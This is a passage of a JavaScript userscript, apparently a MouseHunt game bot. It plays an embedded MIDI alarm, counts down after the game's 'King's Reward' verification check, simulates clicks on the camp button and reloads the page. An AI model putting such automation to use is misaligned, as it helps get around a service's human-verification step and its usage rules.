%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%5F%81%70%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%5F%83%60%89%23%50%00%99%28%5F%83%60%89%28%50%00%99%23%5F%83%60%89%23%50%00%99%28%5F%83%60%89%28%50%00%99%23%5F%83%60%89%23%50%00%99%28%5F%83%60%89%28%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%00%24%5F%83%60%89%23%50%00%24%50%00%99%28%5F%83%60%89%28%50%00%99%23%5F%00%24%5F%83%60%89%23%50%00%24%50%00%99%28%5F%83%60%89%28%50%00%99%23%5F%83%60%89%23%50%00%99%28%5F%83%60%89%28%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%00%24%5F%83%60%89%23%50%00%24%50%00%99%28%5F%83%60%89%28%50%00%99%23%5F%00%24%5F%83%60%89%23%50%00%24%50%00%99%28%5F%83%60%89%28%50%00%99%23%5F%83%60%89%23%50%00%99%28%5F%83%60%89%28%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%00%24%5F%83%60%89%23%50%00%24%50%00%99%28%5F%83%60%89%28%50%00%99%23%5F%00%24%5F%83%60%89%23%50%00%24%50%00%99%28%5F%83%60%89%28%50%00%99%23%5F%83%60%89%23%50%00%99%28%5F%83%60%89%28%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%83%60%89%23%50%00%99%28%5F%83%60%89%28%50%00%99%23%5F%83%60%89%23%50%00%99%28%5F%83%60%89%28%50%00%99%23%5F%83%60%89%23%50%00%99%28%5F%83%60%89%28%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%83%60%89%23%50%00%99%28%5F%83%60%89%28%50%00%99%23%5F%83%60%89%23%50%00%99%28%5F%83%60%89%28%50%00%99%23%5F%83%60%89%23%50%00%99%28%5F%83%60%89%28%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%83%60%89%23%50%00%99%28%5F%83%60%89%28%50%00%99%23%5F%83%60%89%23%50%00%99%28%5F%83%60%89%28%50%00%99%23%5F%83%60%89%23%50%00%99%28%5F%83%60%89%28%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%83%60%89%23%50%00%99%28%5F%83%60%89%28%50%00%99%23%5F%83%60%89%23%50%00%99%28%5F%83%60%89%28%50%00%99%23%5F%83%60%89%23%50%00%99%28%5F%83%60%89%28%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%23%5F%78%89%23%50%00%99%31%5F%83%60%89%31%50%00%99%39%5F%87%40%89%39%50%83%60%99%23%7F%00%24%7F%00%24%5F%00%31%6F%83%60%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%83%60%89%23%50%00%24%50%00%24%50%00%2C%50%78%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%81%70%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%83%60%89%23%50%00%24%50%00%24%50%00%2C%50%78%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%81%70%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%83%60%89%23%50%00%24%50%00%24%50%00%2C%50%78%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%81%70%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%83%60%89%23%50%00%24%50%00%24%50%00%2C%50%78%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%81%70%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%83%60%89%23%50%00%24%50%00%24%50%00%2C%50%78%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%81%70%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%83%60%89%23%50%00%24%50%00%24%50%00%2C%50%78%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%81%70%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%82%68%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%82%68%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%5F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%82%68%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%82%68%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%5F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%82%68%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%82%68%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%5F%78%89%23%50%00%24%50%00%24%50%00%2C%50%8F%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%82%68%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%82%68%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%5F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%82%68%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%82%68%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%5F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%82%68%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%82%68%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%5F%78%89%23%50%00%24%50%00%24%50%00%2C%50%8F%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%82%68%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%82%68%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%5F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%82%68%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%82%68%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%5F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%82%68%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%82%68%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%5F%78%89%23%50%00%24%50%00%24%50%00%2C%50%8F%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%82%68%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%82%68%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%5F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%82%68%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%82%68%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%5F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%FF%2F%00'; // end of track
			
			// Extra note: In Opera: hidden cannot be set to true, else it will fail to play with unknown reason.
			
			var embedMidiElement = document.getElementsByName('embedMidiElement');
			if (embedMidiElement.length > 0)
			{
				// remove any same element if found
				document.body.removeChild(embedMidiElement[0]);
				embedMidiElement = null;
			}
			
			embedMidiElement = document.createElement('embed');
			embedMidiElement.setAttribute('id', "embedMidiElement");
			embedMidiElement.setAttribute('name', "embedMidiElement");
			embedMidiElement.setAttribute('src', MIDI_DATA);
			embedMidiElement.setAttribute('type', 'audio/midi');
			embedMidiElement.setAttribute('controller', 'false');
			embedMidiElement.setAttribute('autoplay', 'true');
			embedMidiElement.setAttribute('loop', 'true');
			embedMidiElement.innerHTML = "<noembed><bgsound src=\"http://images.norack.info/prodigy_-_girls.mid\" loop=\"infinite\"></noembed>";
			document.body.appendChild(embedMidiElement);
			
			MIDI_DATA = null;
			embedMidiElement = null;
		}
		
		if (browser == "opera")
		{
			// since opera cannot loop the king reward music, then we play it again.
			window.setTimeout(function () { playKingRewardSound() }, 214000);
		}
		
		browser = null;
	}
}

function kingRewardCountdownTimer()
{
	var dateNow = new Date();
	var intervalTime = timeElapsed(lastDateRecorded, dateNow);
	lastDateRecorded = null;
	lastDateRecorded = dateNow;
	dateNow = null;

	if (reloadKingReward)
	{
		kingPauseTime -= intervalTime;
	}
	
	if (lastKingRewardSumTime != -1)
	{
		lastKingRewardSumTime += intervalTime;
	}
	
	intervalTime = null;
	
	if (kingPauseTime <= 0)
	{
		// update timer
		displayTimer("King's Reward - Reloading...", "Reloading...", "Reloading...");
		
		// simulate mouse click on the camp button
		var campElement = document.getElementsByClassName('campbutton')[0].firstChild;
		fireEvent(campElement, 'click');
		campElement = null;
		
		// reload the page if click on the camp button fail
		window.setTimeout(function () { reloadWithMessage("Fail to click on camp button. Reloading...", false); }, 5000);
	}
	else
	{
		if (reloadKingReward)
		{
			// update timer
			displayTimer("King's Reward - Reload in " + timeformat(kingPauseTime), 
				"Reloading in " + timeformat(kingPauseTime), 
				"Reloading in " + timeformat(kingPauseTime));
		}
			
		// set king reward sum time
		displayKingRewardSumTime(timeFormatLong(lastKingRewardSumTime));
		
		if (!checkResumeButton())
		{
			window.setTimeout(function () { (kingRewardCountdownTimer)() }, timerRefreshInterval * 1000);
		}
	}	
}

function checkResumeButton()
{
	var found = false;
	
	var linkElementList = document.getElementsByTagName('img');
